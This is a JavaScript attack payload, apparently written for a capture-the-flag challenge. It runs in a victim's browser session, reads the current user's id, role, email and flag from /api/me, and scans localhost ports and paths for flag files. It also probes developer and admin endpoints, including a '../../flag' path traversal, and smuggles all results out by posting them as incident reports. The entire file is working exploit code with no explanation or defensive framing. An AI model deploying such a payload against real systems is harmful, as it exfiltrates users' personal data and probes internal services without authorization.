// Simpler probe - no async wrapper, just sync XHR for reliability
var O = self.location.origin;
function P(t) {
  try {
    var x = new XMLHttpRequest();
    x.open('POST', O + '/api/incidents', false);
    x.setRequestHeader('Content-Type', 'application/json');
    x.send(JSON.stringify({title: String(t).slice(0, 105), facility: 'Meridian-2', severity: 'Watch'}));
  } catch(e) {}
}

P('P6|START|' + O);

// Check /api/me
try {
  var x = new XMLHttpRequest();
  x.open('GET', O + '/api/me', false);
  x.send();
  var me = JSON.parse(x.responseText);
  var u = me.user || {};
  P('P6|ME|' + u.id + '|' + u.role + '|' + u.email);
  var f = u.flag || 'none';
  P('P6|FL|' + f.slice(0, 90));
  if (f.length > 90) P('P6|FL2|' + f.slice(90));
} catch(e) { P('P6|MEERR|' + e); }

// Try localhost:3000 (common Node.js port)
var ports = [3000, 8080, 80, 5000];
var paths = ['/flag', '/', '/api/flag', '/flag.txt'];
for (var i = 0; i < ports.length; i++) {
  for (var j = 0; j < paths.length; j++) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', 'http://localhost:' + ports[i] + paths[j], false);
      x.send();
      P('P6|L|' + ports[i] + paths[j] + '|' + x.status + '|' + x.responseText.slice(0, 50));
    } catch(e) {
      P('P6|LF|' + ports[i] + paths[j] + '|' + String(e).slice(0, 50));
    }
  }
}

// Try same-origin endpoints as developer
var eps = ['/api/admin/audit?log=2', '/api/developer/audit', '/api/developer/tools',
           '/api/developer/exec', '/api/developer/cat', '/api/developer/flag',
           '/api/escalations', '/api/reports', '/flag', '/api/cat',
           '/api/admin/audit?log=../../flag'];
for (var k = 0; k < eps.length; k++) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', O + eps[k], false);
    x.send();
    if (x.status === 200) {
      P('P6|EP|' + eps[k] + '|' + x.status + '|' + x.responseText.slice(0, 50));
    }
  } catch(e) {}
}

P('P6|DONE');
